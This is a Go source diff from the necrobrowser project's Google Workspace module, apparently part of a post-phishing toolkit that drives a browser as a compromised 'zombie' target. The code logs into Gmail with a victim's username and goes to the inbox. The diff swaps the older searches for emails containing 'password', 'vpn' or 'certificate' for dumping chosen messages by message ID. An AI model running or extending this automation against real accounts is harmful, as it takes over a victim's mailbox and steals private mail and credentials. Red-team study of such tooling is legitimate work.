@@ -2,8 +2,7 @@ package gsuite
 
 import (
 	"context"
-
-	"github.com/evilsocket/islazy/tui"
+	"github.com/muraenateam/necrobrowser/action/navigation"
 
 	"github.com/muraenateam/necrobrowser/action"
 	"github.com/muraenateam/necrobrowser/action/login"
@@ -20,11 +19,11 @@ const (
 type GSuite struct {
 	zombie.Target
 
-	MyAccount         string
-	GMailUrl          string
-	GDriveUrl         string
-	GMailSearch       string
-	SearchForKeywords []string
+	MyAccount   string
+	GMailUrl    string
+	GDriveUrl   string
+	GMailSearch string
+	MessageIds  []string
 }
 
 type Extrusion struct {
@@ -35,12 +34,12 @@ func NewGSuite(target zombie.Target) *GSuite {
 
 	target.Tag = zombie.GetTag(Name)
 	return &GSuite{
-		Target:            target,
-		MyAccount:         "https://myaccount.google.com/personal-info",
-		GMailUrl:          "https://mail.google.com/mail/#inbox",
-		GDriveUrl:         "https://drive.google.com/drive/my-drive",
-		GMailSearch:       "https://mail.google.com/mail/u/0/#search/",
-		SearchForKeywords: []string{"password", "vpn", "certificate"},
+		Target:      target,
+		MyAccount:   "https://myaccount.google.com/personal-info",
+		GMailUrl:    "https://mail.google.com/mail/#inbox",
+		GDriveUrl:   "https://drive.google.com/drive/my-drive",
+		GMailSearch: "https://mail.google.com/mail/u/0/#search/",
+		MessageIds:  []string{"WE3gZntbRyu_-ArGKEu-1g@ismtpd0033p1mdw1.sendgrid.net", "N--9o4ddQzaSaaLdZrxFIQ@ismtpd0030p1mdw1.sendgrid.net"},
 	}
 }
 
@@ -68,7 +67,7 @@ func (z *GSuite) Instrument() (interface{}, error) {
 
 	loginAutomation := &login.Login{
 		Action:   a,
-		URL:      "https://accounts.google.com/ServiceLogin",
+		URL:      "https://mail.google.com/mail",
 		Username: z.Target.Username,
 		// for headless mode, use this selector
 		//UsernameSelector: `#gaia_firstform > div > div > div > div > input`,
@@ -83,22 +82,22 @@ func (z *GSuite) Instrument() (interface{}, error) {
 		return nil, err
 	}
 
-	// Set session Cookies
-	//c := &cookie.Cookie{Action: a}
-	//if err = c.SetSessionCookies(); err != nil {
-	//	log.Error("Error setting session cookies: %v", err)
-	//	return nil, err
-	//}
+	nav := navigation.Navigation{
+		Action: a,
+		URL:    "https://mail.google.com/mail/u/0/#inbox",
+	}
+	if err = nav.Navigate(); err != nil {
+		log.Error("Error navigating to Gmail: %v", err)
+		return nil, err
+	}
 
-	z.Debug("Extracting gmail data information")
+	z.Debug("Extracting stuff now...")
 
 	// search for defined keywords
-	for _, keyword := range z.SearchForKeywords {
+	for _, msgId := range z.MessageIds {
 
-		emails := z.dumpEmailByKeyword(keyword)
-		if emails != "" {
-			log.Info("[%s] eMails \n %s", tui.Bold(tui.Green(keyword)), emails)
-		}
+		z.dumpEmailByMessageId(msgId)
+
 	}
 
 	return "", nil
